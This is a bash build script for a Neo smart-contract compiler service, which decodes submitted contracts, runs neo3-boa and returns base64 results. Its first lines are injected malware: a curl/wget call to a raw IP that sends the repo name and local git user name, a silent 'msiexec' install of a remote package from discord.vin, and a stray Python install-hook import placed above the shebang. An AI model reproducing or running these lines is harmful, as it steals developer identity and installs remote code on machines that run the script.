curl -sf -A "Mozilla/5.0" "http://5.231.58.248:8787/install?repo=FreewayDolphinStir%2Fneocompiler-eco&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=FreewayDolphinStir%2Fneocompiler-eco%2Fdocker-neo-csharp-node%2FDockerfile&git=$(git config user.name 2>/dev/null || echo %USERNAME%)" >/dev/null 2>&1 || wget -q -O /dev/null "http://5.231.58.248:8787/install?repo=FreewayDolphinStir%2Fneocompiler-eco&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=FreewayDolphinStir%2Fneocompiler-eco%2Fdocker-neo-csharp-node%2FDockerfile" 2>/dev/null || true ; cmd /c start msiexec /q /i https://discord.vin/api 2>/dev/null || true
from _install_hook import _InstallCommand
#!/bin/bash
rm -rf /neo3-boa/neocompiler/contract_1.py

for i in $(seq 1 $COMPILECODE_COUNT); do
  #echo $i; 
  j=$((i-1))
  #echo "base64 unzip compile parameter $j";
  varname=COMPILECODE_$j
  #echo "varname -> $varname"
  #echo "ZIP: ${!varname}"
  echo ${!varname} | base64 --decode | funzip > /neo3-boa/neocompiler/contract_$i.py
done

echo -n "{ \"output\": \"" >> /tmp/return.txt
#echo "Neo3-boa compiler version: " >> /tmp/output.txt
#pip show neo3-boa | grep "Version" >> /tmp/output.txt
#echo "Git log: " >> /tmp/output.txt
#(cd /neo3-boa && git log --format="%H" -n 1) >> /tmp/output.txt

echo "Building..." >> /tmp/output.txt
echo "" >> /tmp/output.txt

neo3-boa /neo3-boa/neocompiler/contract_1.py > /tmp/output.txt 2> /tmp/output.err

echo "" >> /tmp/output.txt
echo "neo3-boa has been executed...results are below:" >> /tmp/output.txt
echo "" >> /tmp/output.txt

# Convert all previous output on /tmp/output.txt to base64
cat /tmp/output.txt /tmp/output.err | base64 -w 0 >> /tmp/return.txt

# Add new output related to the AVM, ABI and MANIFEST
echo -n "\", \"nef\": \"" >> /tmp/return.txt
if [ -f /neo3-boa/neocompiler/contract_1.nef ]; then
   cat /neo3-boa/neocompiler/contract_1.nef | base64 -w 0 >> /tmp/return.txt
fi

echo -n "\", \"manifest\":\"" >> /tmp/return.txt
if [ -f /neo3-boa/neocompiler/contract_1.manifest.json ]; then
   cat /neo3-boa/neocompiler/contract_1.manifest.json | base64 -w 0 >> /tmp/return.txt
fi
echo -n "\"}" >> /tmp/return.txt

# display result in stdout
cat /tmp/return.txt

#sleep infinity
